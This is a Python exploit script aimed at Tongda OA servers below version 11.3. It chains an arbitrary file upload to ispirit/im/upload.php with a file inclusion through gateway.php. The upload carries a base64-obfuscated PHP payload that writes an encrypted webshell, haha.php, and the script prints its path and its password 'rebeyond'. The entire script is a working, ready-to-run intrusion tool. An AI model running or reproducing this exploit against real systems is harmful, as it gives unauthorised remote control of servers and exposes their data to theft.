import requests
import base64
import time
import re

def run(host):
    time.sleep(2)
    fileUpload(host)

def file_include_upload(host,ext_name_1,ext_name_2,content): # 配合<11.3包含上传的文件getshell
    content += '[->] 正在尝试包含上传的图片文件' + '\n'
    url = host + 'ispirit/interface/gateway.php'
    try:
        data = {'json':"{\"url\":\"general/../../attach/im/%s/%s.jpg\"}" % (ext_name_1,ext_name_2)}
        # print(data)
        response = requests.post(url=url,data=data,timeout=2)
        if response.status_code == 200 and '' in response.text:
            content += '[*] 文件包含图片成功,webshell路径如下:' + '\n'
            content += host + 'ispirit/interface/haha.php' + '\n'
            content += 'webshell密码为rebeyond' + '\r\n'
            print(content)
            return content
        else:
            content += '[-] 不存在文件包含漏洞' + '\r\n'
            print(content)
            return content
    except:
        pass

def fileUpload(host): # 通达<11.3任意文件上传 结合
    print("[->] 正在测试是否存在任意文件上传漏洞")
    content = ''
    url = host + 'ispirit/im/upload.php'
    try:
        headers = {'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryBwVAwV3O4sifyhr3'}
        data = base64.b64decode('LS0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5QndWQXdWM080c2lmeWhyMwpDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IlVQTE9BRF9NT0RFIgoKMgotLS0tLS1XZWJLaXRGb3JtQm91bmRhcnlCd1ZBd1YzTzRzaWZ5aHIzCkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0iUCIKCgotLS0tLS1XZWJLaXRGb3JtQm91bmRhcnlCd1ZBd1YzTzRzaWZ5aHIzCkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0iREVTVF9VSUQiCgoxCi0tLS0tLVdlYktpdEZvcm1Cb3VuZGFyeUJ3VkF3VjNPNHNpZnlocjMKQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJBVFRBQ0hNRU5UIjsgZmlsZW5hbWU9ImpwZyIKQ29udGVudC1UeXBlOiBpbWFnZS9qcGVnCgo8P3BocAokZnAgPSBmb3BlbignaGFoYS5waHAnLCAndycpOwokYSA9IGJhc2U2NF9kZWNvZGUoIlBEOXdhSEFLUUdWeWNtOXlYM0psY0c5eWRHbHVaeWd3S1RzS2MyVnpjMmx2Ymw5emRHRnlkQ2dwT3dvZ0lDQWdKR3RsZVQwaVpUUTFaVE15T1dabFlqVmtPVEkxWWlJN0lDOHY2SytsNWErRzZaS2w1TGk2NkwrZTVvNmw1YStHNTZDQk16TGt2WTF0WkRYbGdMem5tb1RsaVkweE51UzlqZSs4ak9tN21PaXVwT2kvbnVhT3BlV3ZodWVnZ1hKbFltVjViMjVrQ2dra1gxTkZVMU5KVDA1Ykoyc25YVDBrYTJWNU93b0pjMlZ6YzJsdmJsOTNjbWwwWlY5amJHOXpaU2dwT3dvSkpIQnZjM1E5Wm1sc1pWOW5aWFJmWTI5dWRHVnVkSE1vSW5Cb2NEb3ZMMmx1Y0hWMElpazdDZ2xwWmlnaFpYaDBaVzV6YVc5dVgyeHZZV1JsWkNnbmIzQmxibk56YkNjcEtRb0pld29KQ1NSMFBTSmlZWE5sTmpSZklpNGlaR1ZqYjJSbElqc0tDUWtrY0c5emREMGtkQ2drY0c5emRDNGlJaWs3Q2drSkNna0pabTl5S0NScFBUQTdKR2s4YzNSeWJHVnVLQ1J3YjNOMEtUc2thU3NyS1NCN0NpQWdJQ0FKQ1FrZ0pIQnZjM1JiSkdsZElEMGdKSEJ2YzNSYkpHbGRYaVJyWlhsYkpHa3JNU1l4TlYwN0lBb2dJQ0FnQ1FrSmZRb0pmUW9KWld4elpRb0pld29KQ1NSd2IzTjBQVzl3Wlc1emMyeGZaR1ZqY25sd2RDZ2tjRzl6ZEN3Z0lrRkZVekV5T0NJc0lDUnJaWGtwT3dvSmZRb2dJQ0FnSkdGeWNqMWxlSEJzYjJSbEtDZDhKeXdrY0c5emRDazdDaUFnSUNBa1puVnVZejBrWVhKeVd6QmRPd29nSUNBZ0pIQmhjbUZ0Y3owa1lYSnlXekZkT3dvSlkyeGhjM01nUTN0d2RXSnNhV01nWm5WdVkzUnBiMjRnWDE5cGJuWnZhMlVvSkhBcElIdGxkbUZzS0NSd0xpSWlLVHQ5ZlFvZ0lDQWdRR05oYkd4ZmRYTmxjbDltZFc1aktHNWxkeUJES0Nrc0pIQmhjbUZ0Y3lrN0NqOCtDZz09Iik7CmZ3cml0ZSgkZnAsICRhKTsKZmNsb3NlKCRmcCk7Cj8+Ci0tLS0tLVdlYktpdEZvcm1Cb3VuZGFyeUJ3VkF3VjNPNHNpZnlocjMtLQ==')
        response = requests.post(url=url,data=data,headers=headers,timeout=2)
        print(response.text)
        if 'OK' in response.text:
            content += '[*] 图片上传成功，正在尝试文件包含图片\n'
            pattern_ext2 = re.compile('\_(.*?)\|',re.S)
            pattern_ext1 = re.compile('\@(.*?)\_',re.S)
            ext_name_2 = re.findall(pattern_ext2,response.text)[0]
            ext_name_1 = re.findall(pattern_ext1,response.text)[0]
            # print("图片名称为：",ext_name_2)
            # print("目录名称为：",ext_name_1)  # 获取目录名和图片名
            content = file_include_upload(host,ext_name_1,ext_name_2,content)
            return content
        else:
            content += '[-] 不存在通达<11.3任意文件上传' + '\r\n'
            print(content)
            return content
    except:
        print("[-] 文件上传检测失败\n")

